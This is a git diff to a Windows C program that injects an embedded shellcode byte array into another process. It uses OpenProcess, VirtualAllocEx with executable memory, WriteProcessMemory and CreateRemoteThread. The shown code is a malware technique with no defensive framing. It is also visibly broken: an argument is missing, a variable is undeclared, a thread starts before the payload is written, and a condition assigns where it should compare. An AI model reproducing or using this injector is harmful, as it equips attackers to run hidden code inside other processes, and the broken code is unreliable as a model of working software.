@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 
+DWORD PID = NULL;
 HANDLE hProcess, hThread = NULL;
 
 unsigned char test[] =
@@ -43,6 +44,29 @@ unsigned char test[] =
 "\x2a\x0a\x41\x89\xda\xff\xd5";
 
 int main(){
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-    
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE);
+
+    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(test), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    /*Writing some bytes*/
+
+    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0);
+
+    /*Writing some bytes (last time for sure)*/
+    WriteProcessMemory(hProcess, rBuffer, test, sizeof(test), NULL);
+
+    /*Creating some threads*/
+    hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)rBuffer,
+        NULL,
+        0,
+        0
+    );
+    if (hThread = NULL){
+        CloseHandle(hProcess);
+        return 1;
+    }
 }
